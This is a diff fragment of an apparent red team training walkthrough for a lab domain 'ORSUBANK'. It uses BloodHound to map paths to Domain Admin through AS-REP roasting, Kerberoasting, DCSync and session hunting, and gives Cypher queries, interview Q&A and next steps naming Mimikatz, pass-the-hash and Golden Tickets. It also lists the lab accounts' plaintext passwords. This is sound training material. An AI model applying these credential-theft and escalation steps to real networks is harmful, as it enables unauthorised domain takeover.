---> 03_asrep_roasting.md
+3. See the path:
+   - vamsi.krishna → [some path] → Domain Admins
 
-If you found GenericAll or other ACL abuses:
---> 05_acl_abuse.md
-
-If you found admin access to a machine with DA session:
---> 04_credential_dumping.md
-
-If you found a direct path with existing credentials:
---> 06_pass_the_hash.md or 06b_pass_the_ticket.md
+Or if there's no direct path:
+   - You may need to compromise another user first
+   - BloodHound helps you plan multi-step attacks
 ```
 
-## Summary: What You Learned
+---
 
-| Topic | Key Takeaway |
-|-------|--------------|
-| Networks | Computers connected together, sharing resources |
-| Active Directory | Microsoft's central directory for user/computer management |
-| Domain Controller | The server that runs AD - the crown jewel |
-| LDAP | Protocol to query AD - how we enumerate |
-| Kerberos | Authentication protocol with many attack vectors |
-| Attack Paths | Chain of misconfigurations leading to Domain Admin |
-| BloodHound | Tool that visualizes attack paths automatically |
-| SharpHound | Data collector that queries AD and outputs JSON |
-| Enumeration | First step after initial access - map everything! |
+## Part 8.3: Finding All Paths to DA
+
+```
+ALL ATTACK PATHS IN ORSUBANK:
+────────────────────────────────────────────────────────────────
+
+PATH 1: AS-REP Roast harsha.vardhan
+────────────────────────────────────
+harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → DA
+
+PATH 2: Kerberoast svc_backup
+─────────────────────────────
+svc_backup (has SPN) → Domain Admins (direct member)
+
+PATH 3: DCSync from WS01
+────────────────────────
+WS01$ → Has DCSync rights → Get all hashes → DA
+
+PATH 4: Session Hunting
+───────────────────────
+WS01 → lakshmi.devi session → Credential theft → lakshmi is DA
+
+PATH 5: Kerberoast any service + escalate
+─────────────────────────────────────────
+sqlservice/httpservice → get password → look for reused creds
+
+
+BloodHound visualizes ALL of these!
+```
 
 ---
 
-**CONTINUE YOUR JOURNEY:**
-
-Based on what BloodHound found, pick your next attack:
-- [02_kerberoasting.md](./02_kerberoasting.md) - If you found service accounts with SPNs
-- [03_asrep_roasting.md](./03_asrep_roasting.md) - If you found accounts with pre-auth disabled
-- [04_credential_dumping.md](./04_credential_dumping.md) - If you have admin access to a machine
+# PART 9: INTERVIEW QUESTIONS & REFERENCE
 
 ---
 
-*Document created for ORSUBANK Red Team Training Lab*
-*For authorized educational use only*
+## Part 9.1: Interview Questions
+
+### BloodHound & AD Enumeration Questions
+
+**Q: What is BloodHound and why is it used?**
+A: BloodHound is an AD attack path visualization tool. It collects AD data, stores it in a graph database (Neo4j), and shows visual attack paths from compromised users to high-value targets like Domain Admins.
+
+**Q: What is SharpHound?**
+A: SharpHound is the data collection component of BloodHound. It's a C# executable that queries AD via LDAP to gather users, groups, sessions, ACLs, and more. It outputs JSON files in a ZIP archive.
+
+**Q: What collection methods does SharpHound support?**
+A: Main methods include:
+- Default: Common data
+- All: Everything (recommended for first run)
+- Session: Active login sessions
+- ACL: Access control lists
+- LoggedOn: Who's logged in where
+
+**Q: What is a nested group attack?**
+A: When a user is in GroupA, which is in GroupB, which is in Domain Admins, the user is effectively a Domain Admin through nesting. BloodHound reveals these hidden paths.
+
+**Q: What database does BloodHound use?**
+A: Neo4j, a graph database. It stores nodes (users, computers, groups) and edges (relationships like MemberOf, HasSession, etc.).
+
+**Q: What is the Cypher query to find all Domain Admins?**
+A: `MATCH (n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) OPTIONAL MATCH (n)<-[r:MemberOf*1..]-(m) RETURN n,m`
+
+**Q: What are common BloodHound edge types?**
+A: 
+- MemberOf: Group membership
+- HasSession: User logged into computer
+- AdminTo: Admin rights on computer
+- GenericAll/GenericWrite: Dangerous ACL permissions
+- DCSync: Replication rights
+- CanRDP: Can remote desktop
+
+**Q: How do you find Kerberoastable users in BloodHound?**
+A: Click Analysis → "List All Kerberoastable Accounts" or query: `MATCH (u:User {hasspn:true}) RETURN u`
+
+**Q: How do you find AS-REP Roastable users?**
+A: Click Analysis → "Find AS-REP Roastable Users" or query: `MATCH (u:User {dontreqpreauth:true}) RETURN u`
+
+**Q: What is session hunting?**
+A: Finding computers where privileged users (like DAs) have active sessions. If you compromise that computer, you might steal their credentials from memory.
+
+---
+
+### ORSUBANK Specific Questions
+
+**Q: Who are the Domain Admins in ORSUBANK?**
+A: ammulu.orsu, svc_backup, Administrator, and harsha.vardhan (through nested groups).
+
+**Q: Which ORSUBANK users are AS-REP Roastable?**
+A: pranavi, harsha.vardhan, kiran.kumar
+
+**Q: Which ORSUBANK accounts are Kerberoastable?**
+A: sqlservice, httpservice, iisservice, backupservice, svc_backup
+
+**Q: What's special about svc_backup?**
+A: It's both Kerberoastable (has an SPN) AND a Domain Admin. Cracking it gives you DA!
+
+**Q: What's the nested group path to DA in ORSUBANK?**
+A: harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins
+
+**Q: What special rights does WS01$ have?**
+A: DCSync rights - the WS01 computer account can replicate the AD database, allowing anyone with SYSTEM on WS01 to get all domain password hashes.
+
+---
+
+## Part 9.2: Troubleshooting
+
+| Problem | Cause | Solution |
+|---------|-------|----------|
+| BloodHound won't connect to Neo4j | Neo4j not running | Run `sudo neo4j start` |
+| SharpHound error: "Access denied" | Need domain user privileges | Run as domain user (vamsi.krishna) |
+| No sessions found | SharpHound run during off-hours | Run again when users are logged in |
+| Import fails | Corrupt ZIP | Re-run SharpHound |
+| "No path found" | User can't reach DA | Try different collection, check ACLs |
+| Neo4j password rejected | Wrong password | Reset via http://localhost:7474 |
+| BloodHound shows empty graph | Data not imported | Click Upload and import ZIP |
+
+---
+
+## Part 9.3: What's Next
+
+```
+NEXT WALKTHROUGHS:
+────────────────────────────────────────────────────────────────
+
+Now that you've enumerated ORSUBANK with BloodHound, proceed to:
+
+02_kerberoasting.md
+───────────────────
+Attack the service accounts you found:
+- sqlservice (MYpassword123#)
+- httpservice (Summer2024!)
+- svc_backup (Backup@2024!) ← The DA one!
+
+03_asrep_roasting.md
+────────────────────
+Attack users without pre-auth:
+- harsha.vardhan (Customer2024!) ← Leads to DA!
+- pranavi (Branch123!)
+- kiran.kumar (Finance1!)
+
+04_credential_dumping.md
+────────────────────────
+Dump credentials from WS01:
+- Mimikatz sekurlsa::logonpasswords
+- Catch lakshmi.devi's session
+
+05_lateral_movement.md
+──────────────────────
+Move from WS01 to DC01:
+- Pass-the-hash
+- PSExec
+- WinRM
+
+06_domain_dominance.md
+──────────────────────
+Own the entire domain:
+- DCSync
+- Golden Ticket
+- Persistence
+```
+
+---
+
+*END OF DOCUMENT*
+
+*You now know how to enumerate ORSUBANK Active Directory using BloodHound!*
+
+*Key findings:*
+- *ammulu.orsu and svc_backup are direct Domain Admins*
+- *harsha.vardhan is DA through nested groups*
+- *5 Kerberoastable accounts (svc_backup is DA!)*
+- *3 AS-REP Roastable accounts*
+- *WS01$ has DCSync rights*
+
+*Use this knowledge ethically and legally!*
